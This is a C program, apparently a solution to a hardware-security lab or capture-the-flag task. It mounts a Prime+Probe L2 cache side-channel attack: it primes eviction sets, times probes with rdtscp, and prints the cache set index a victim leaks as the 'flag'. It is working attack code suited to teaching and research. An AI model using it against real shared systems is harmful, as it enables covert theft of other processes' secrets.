#include "util.h"
#include <sys/mman.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define BUFF_SIZE (1<<21)
#define L2_WAYS 16
#ifndef STRIDE
#define STRIDE (1<<16)
#endif

#define REPS_PER_SET 8
#define PASSES_PHASE1 150
#define PASSES_PHASE2 300

#define N_KNOWN_NOISE 2
static const int KNOWN_NOISE[N_KNOWN_NOISE] = {815, 886};

static inline uint64_t rdtscp(void) {
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

void *buf;

static inline void prime_set(int set_index) {
    volatile char *base = (volatile char *)buf + set_index * 64;
    for (int i = 0; i < L2_WAYS; i++) { (void)*base; base += STRIDE; }
    base = (volatile char *)buf + set_index * 64;
    for (int i = 0; i < L2_WAYS; i++) { (void)*base; base += STRIDE; }
}

static inline uint64_t probe_set(int set_index) {
    volatile char *base = (volatile char *)buf + set_index * 64;
    uint64_t start = rdtscp();
    for (int i = 0; i < L2_WAYS; i++) { (void)*base; base += STRIDE; }
    return rdtscp() - start;
}

static int cmp_u64_asc(const void *a, const void *b) {
    uint64_t x = *(uint64_t*)a, y = *(uint64_t*)b;
    return (x > y) - (x < y);
}

static int is_known_noise(int s) {
    for (int i = 0; i < N_KNOWN_NOISE; i++)
        if (KNOWN_NOISE[i] == s) return 1;
    return 0;
}

void run_scan(uint64_t threshold, int passes, uint32_t *hit_count, uint64_t *lat_sum) {
    memset(hit_count, 0, 1024 * sizeof(uint32_t));
    memset(lat_sum,   0, 1024 * sizeof(uint64_t));
    for (int p = 0; p < passes; p++) {
        for (int i = 0; i < 1024; i++) {
            for (int r = 0; r < REPS_PER_SET; r++) {
                prime_set(i);
                for (volatile int w = 0; w < 200; w++);
                uint64_t t = probe_set(i);
                lat_sum[i] += t;
                if (t > threshold) hit_count[i]++;
            }
        }
    }
}

void sort_by_hits(uint32_t *hit_count, uint64_t *lat_sum, int *order) {
    for (int i = 0; i < 1024; i++) order[i] = i;
    for (int i = 1; i < 1024; i++) {
        int key = order[i], j = i - 1;
        while (j >= 0) {
            int a = order[j], b = key;
            if ((hit_count[a] > hit_count[b]) ||
                (hit_count[a] == hit_count[b] && lat_sum[a] >= lat_sum[b])) break;
            order[j+1] = order[j]; j--;
        }
        order[j+1] = key;
    }
}

int main(void) {
    srand(time(NULL));

    buf = mmap(NULL, BUFF_SIZE, PROT_READ|PROT_WRITE,
               MAP_POPULATE|MAP_ANONYMOUS|MAP_PRIVATE|MAP_HUGETLB, -1, 0);
    if (buf == (void*)-1) { perror("mmap"); exit(EXIT_FAILURE); }
    for (int i = 0; i < BUFF_SIZE; i += 4096) ((volatile char*)buf)[i] = 1;

    #define CAL_N (1024 * 50)
    uint64_t *cal = malloc(CAL_N * sizeof(uint64_t));
    int ci = 0;
    for (int rep = 0; rep < 50; rep++)
        for (int i = 0; i < 1024; i++) {
            prime_set(i);
            asm volatile("" ::: "memory");
            cal[ci++] = probe_set(i);
        }
    qsort(cal, ci, sizeof(uint64_t), cmp_u64_asc);
    uint64_t p50 = cal[(int)(ci*0.50)];
    uint64_t p99 = cal[(int)(ci*0.99)];
    free(cal);
    uint64_t threshold = p99 + (p99 - p50) / 5;

    uint32_t hit_count[1024];
    uint64_t lat_sum[1024];
    int order[1024];

    run_scan(threshold, PASSES_PHASE1, hit_count, lat_sum);
    sort_by_hits(hit_count, lat_sum, order);

    uint32_t noise_floor = hit_count[order[10]] * 3;
    if (noise_floor < 50) noise_floor = 50;

    int signal1[1024], nsignal1 = 0;
    for (int i = 0; i < 1024; i++) {
        if (hit_count[order[i]] >= noise_floor)
            signal1[nsignal1++] = order[i];
        else break;
    }

    int flag_candidate = -1;
    uint32_t lowest_hits = UINT32_MAX;
    for (int i = 0; i < nsignal1; i++) {
        int s = signal1[i];
        if (!is_known_noise(s) && hit_count[s] < lowest_hits) {
            lowest_hits = hit_count[s];
            flag_candidate = s;
        }
    }

    run_scan(threshold, PASSES_PHASE2, hit_count, lat_sum);
    sort_by_hits(hit_count, lat_sum, order);

    noise_floor = hit_count[order[10]] * 3;
    if (noise_floor < 50) noise_floor = 50;

    int signal2[1024], nsignal2 = 0;
    for (int i = 0; i < 1024; i++) {
        if (hit_count[order[i]] >= noise_floor)
            signal2[nsignal2++] = order[i];
        else break;
    }

    int in_phase1[1024] = {0};
    for (int i = 0; i < nsignal1; i++) in_phase1[signal1[i]] = 1;

    int flag = -1;
    uint32_t flag_hits = 0;
    lowest_hits = UINT32_MAX;

    for (int i = 0; i < nsignal2; i++) {
        int s = signal2[i];
        if (in_phase1[s] && !is_known_noise(s) && hit_count[s] < lowest_hits) {
            lowest_hits = hit_count[s];
            flag = s;
            flag_hits = hit_count[s];
        }
    }

    if (flag == -1) {
        for (int i = 0; i < nsignal2; i++) {
            int s = signal2[i];
            if (in_phase1[s] && hit_count[s] > flag_hits) {
                flag_hits = hit_count[s];
                flag = s;
            }
        }
    }

    printf("%d\n", flag);
    return 0;
}